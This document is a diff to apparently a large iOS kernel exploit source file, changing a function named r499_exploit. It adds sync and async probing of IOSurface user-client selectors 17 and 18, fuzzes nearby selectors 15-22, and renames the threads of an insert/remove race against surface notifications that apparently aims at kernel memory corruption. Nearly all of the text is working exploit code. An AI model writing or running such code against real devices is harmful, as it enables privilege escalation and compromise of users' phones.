@@ -27038,64 +27038,90 @@ static void r499_exploit(void) {
 
     /* ================================================================
      * Phase 1: Probe sel 17/18 calling convention
+     *
+     * sel 17 is historically s_set_surface_notify — an ASYNC method
+     * that takes a wake_port. Must use IOConnectCallAsyncMethod.
      * ================================================================ */
-    rlog("\n--- Phase 1: Probe sel 17/18 ---\n");
+    rlog("\n--- Phase 1: Probe sel 17/18 (sync AND async) ---\n");
     fflush(stdout);
 
     IOSurfaceRef probe_surf = IOSurfaceCreate(props);
     uint32_t probe_id = IOSurfaceGetID(probe_surf);
     rlog("  Probe surface: id=%u\n", probe_id);
 
-    /* Test sel 17 with surface ID */
+    /* 1a: Test SYNC calling convention (may fail on modern iOS) */
     uint64_t si17[2] = { probe_id, 0 };
     uint32_t oc17 = 0;
     kr = IOConnectCallMethod(conn, 17, si17, 2, NULL, 0, NULL, &oc17, NULL, NULL);
-    rlog("  sel17(id=%u, flags=0): kr=0x%x oc=%u\n", probe_id, kr, oc17);
+    rlog("  SYNC sel17(id=%u, flags=0): kr=0x%x\n", probe_id, kr);
 
-    /* Test sel 17 with flags=1 */
-    si17[1] = 1;
-    kr = IOConnectCallMethod(conn, 17, si17, 2, NULL, 0, NULL, &oc17, NULL, NULL);
-    rlog("  sel17(id=%u, flags=1): kr=0x%x oc=%u\n", probe_id, kr, oc17);
-
-    /* Test sel 18 to remove */
     uint64_t si18[1] = { probe_id };
     uint32_t oc18 = 0;
     kr = IOConnectCallMethod(conn, 18, si18, 1, NULL, 0, NULL, &oc18, NULL, NULL);
-    rlog("  sel18(id=%u): kr=0x%x oc=%u\n", probe_id, kr, oc18);
+    rlog("  SYNC sel18(id=%u): kr=0x%x\n", probe_id, kr);
 
-    /* Test sel 17 with 1 scalar, 3 scalars, struct input */
-    uint64_t si17_1[1] = { probe_id };
-    kr = IOConnectCallMethod(conn, 17, si17_1, 1, NULL, 0, NULL, &oc17, NULL, NULL);
-    rlog("  sel17(1 scalar): kr=0x%x\n", kr);
+    /* 1b: Test ASYNC calling convention — the CORRECT way */
+    mach_port_t probe_wake = MACH_PORT_NULL;
+    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &probe_wake);
+    mach_port_insert_right(mach_task_self(), probe_wake,
+        probe_wake, MACH_MSG_TYPE_MAKE_SEND);
 
-    uint64_t si17_3[3] = { probe_id, 0, 0 };
-    kr = IOConnectCallMethod(conn, 17, si17_3, 3, NULL, 0, NULL, &oc17, NULL, NULL);
-    rlog("  sel17(3 scalars): kr=0x%x\n", kr);
+    /* Async sel 17 with wake_port, 0 scalar inputs */
+    uint64_t aref[1] = { 0x41414141 };
+    kr = IOConnectCallAsyncMethod(conn, 17, probe_wake, aref, 1,
+        NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
+    rlog("  ASYNC sel17(0 scalars): kr=0x%x\n", kr);
 
-    /* struct input: surface ID as 4-byte struct */
-    uint32_t st17 = probe_id;
-    kr = IOConnectCallMethod(conn, 17, NULL, 0, &st17, 4, NULL, NULL, NULL, NULL);
-    rlog("  sel17(struct 4B): kr=0x%x\n", kr);
+    /* Async sel 17 with wake_port, 1 scalar (surface ID) */
+    uint64_t asi17_1[1] = { probe_id };
+    kr = IOConnectCallAsyncMethod(conn, 17, probe_wake, aref, 1,
+        asi17_1, 1, NULL, 0, NULL, NULL, NULL, NULL);
+    rlog("  ASYNC sel17(1 scalar, id=%u): kr=0x%x\n", probe_id, kr);
 
-    /* Try with struct output to see if kernel returns anything */
-    uint8_t out17[64] = {0};
-    size_t out17_sz = sizeof(out17);
-    uint64_t osc17[4] = {0};
-    uint32_t osc17_cnt = 4;
-    si17[0] = probe_id; si17[1] = 0;
-    kr = IOConnectCallMethod(conn, 17, si17, 2, NULL, 0, osc17, &osc17_cnt, out17, &out17_sz);
-    rlog("  sel17(2sc, out): kr=0x%x osc_cnt=%u out_sz=%zu\n", kr, osc17_cnt, out17_sz);
-    if (osc17_cnt > 0) {
-        for (uint32_t i = 0; i < osc17_cnt && i < 4; i++)
-            rlog("    osc[%d] = 0x%llx\n", i, osc17[i]);
+    /* Async sel 17 with wake_port, 2 scalars (surface ID + flags) */
+    uint64_t asi17_2[2] = { probe_id, 0 };
+    kr = IOConnectCallAsyncMethod(conn, 17, probe_wake, aref, 1,
+        asi17_2, 2, NULL, 0, NULL, NULL, NULL, NULL);
+    rlog("  ASYNC sel17(2 scalars, id=%u flags=0): kr=0x%x\n", probe_id, kr);
+
+    /* Async sel 17 with struct input (24 bytes, as historical docs say) */
+    uint8_t asi17_st[24] = {0};
+    memcpy(asi17_st, &probe_id, 4);
+    kr = IOConnectCallAsyncMethod(conn, 17, probe_wake, aref, 1,
+        NULL, 0, asi17_st, 24, NULL, NULL, NULL, NULL);
+    rlog("  ASYNC sel17(struct 24B): kr=0x%x\n", kr);
+
+    /* Async sel 18 with wake_port, 1 scalar */
+    uint64_t asi18_1[1] = { probe_id };
+    kr = IOConnectCallAsyncMethod(conn, 18, probe_wake, aref, 1,
+        asi18_1, 1, NULL, 0, NULL, NULL, NULL, NULL);
+    rlog("  ASYNC sel18(1 scalar, id=%u): kr=0x%x\n", probe_id, kr);
+
+    /* Async sel 18 with wake_port, 0 scalars */
+    kr = IOConnectCallAsyncMethod(conn, 18, probe_wake, aref, 1,
+        NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
+    rlog("  ASYNC sel18(0 scalars): kr=0x%x\n", kr);
+
+    /* 1c: Try with IOConnectCallAsyncStructMethod if available */
+    /* Test a range of nearby selectors too */
+    rlog("\n  Probing selectors 15-22 with async method:\n");
+    for (uint32_t sel = 15; sel <= 22; sel++) {
+        uint64_t tref[1] = { 0 };
+        uint64_t tsi[2] = { probe_id, 0 };
+        kern_return_t tkr;
+
+        /* Sync */
+        uint32_t toc = 0;
+        tkr = IOConnectCallMethod(conn, sel, tsi, 2, NULL, 0, NULL, &toc, NULL, NULL);
+        rlog("    sel%u SYNC(2sc): kr=0x%x", sel, tkr);
+
+        /* Async */
+        tkr = IOConnectCallAsyncMethod(conn, sel, probe_wake, tref, 1,
+            tsi, 1, NULL, 0, NULL, NULL, NULL, NULL);
+        rlog("  ASYNC(1sc): kr=0x%x\n", tkr);
     }
-    if (out17_sz > 0) {
-        rlog("    out:");
-        for (size_t i = 0; i < out17_sz && i < 32; i++)
-            rlog(" %02x", out17[i]);
-        rlog("\n");
-    }
 
+    mach_port_deallocate(mach_task_self(), probe_wake);
     CFRelease(probe_surf);
     rlog("\n");
 
@@ -27789,7 +27815,7 @@ r498_done:
 
 #include <pthread.h>
 
-struct race_ctx {
+struct r499_race_ctx {
     io_connect_t conn;
     uint32_t surface_id;
     mach_port_t notify_port;
@@ -27801,8 +27827,8 @@ struct race_ctx {
     volatile int remove_errs;
 };
 
-static void *race_insert_thread(void *arg) {
-    struct race_ctx *ctx = (struct race_ctx *)arg;
+static void *r499_insert_thread(void *arg) {
+    struct r499_race_ctx *ctx = (struct r499_race_ctx *)arg;
     while (!ctx->go) usleep(1);
 
     while (!ctx->stop) {
@@ -27823,8 +27849,8 @@ static void *race_insert_thread(void *arg) {
     return NULL;
 }
 
-static void *race_remove_thread(void *arg) {
-    struct race_ctx *ctx = (struct race_ctx *)arg;
+static void *r499_remove_thread(void *arg) {
+    struct r499_race_ctx *ctx = (struct r499_race_ctx *)arg;
     while (!ctx->go) usleep(1);
 
     while (!ctx->stop) {
@@ -28087,7 +28113,7 @@ static void r499_exploit(void) {
                 /* Now race! */
                 rlog("  Starting race threads...\n");
 
-                struct race_ctx ctx = {
+                struct r499_race_ctx ctx = {
                     .conn = conn,
                     .surface_id = sid,
                     .notify_port = notify_port,
@@ -28100,8 +28126,8 @@ static void r499_exploit(void) {
                 };
 
                 pthread_t t_insert, t_remove;
-                pthread_create(&t_insert, NULL, race_insert_thread, &ctx);
-                pthread_create(&t_remove, NULL, race_remove_thread, &ctx);
+                pthread_create(&t_insert, NULL, r499_insert_thread, &ctx);
+                pthread_create(&t_remove, NULL, r499_remove_thread, &ctx);
 
                 ctx.go = 1;
                 usleep(50000); /* Race for 50ms */
